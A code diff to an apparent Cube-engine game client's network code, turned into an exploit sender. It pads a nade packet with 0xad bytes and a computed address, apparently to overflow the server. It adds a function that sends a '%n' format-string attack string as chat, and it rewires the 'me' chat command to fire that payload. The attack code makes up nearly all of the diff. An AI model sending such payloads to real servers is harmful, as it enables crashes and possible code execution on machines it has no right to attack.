@@ -277,13 +277,22 @@ void egk_putint(packetbuf &p, int val)
 
 void send_payload()
 {
-    std::string padding(173, 'G');
+    std::string padding(0xad, 'G');
     packetbuf p(MAXTRANS, ENET_PACKET_FLAG_RELIABLE);
     putint(p, SV_TEXTME);
     sendstring(padding.c_str(), p);
     putint(p, SV_THROWNADE);
-    egk_putint(p, 0x45464748);
-    egk_putint(p, 0x41424344);
+    egk_putint(p, 0x0446050 - 0x40);
+    egk_putint(p, 0x0);
+    sendpackettoserv(1, p.finalize());
+}
+
+void send_format_payload()
+{
+    char format[] = "hello%n%n%n%n%n";
+    packetbuf p(MAXTRANS, ENET_PACKET_FLAG_RELIABLE);
+    putint(p, SV_TEXTME);
+    sendstring(format, p);
     sendpackettoserv(1, p.finalize());
 }
 
@@ -295,7 +304,8 @@ void toserver(char *text)
 
 void toserverme(char *text)
 {
-    _toserver(text, SV_TEXTME, SV_TEAMTEXTME);
+    send_format_payload();
+    // _toserver(text, SV_TEXTME, SV_TEAMTEXTME);
 }
 
 void echo(char *text)
@@ -655,8 +665,7 @@ void sendintro()
     clientpassword[0] = '\0';
     connectrole = CR_DEFAULT;
     putint(p, player1->nextprimweap->type);
-    // loopi(2) putint(p, player1->skin(i));
-    putint(p, 0xdeadbeef);
+    loopi(2) putint(p, player1->skin(i));
     putint(p, 0x0);
     sendpackettoserv(1, p.finalize());
 }
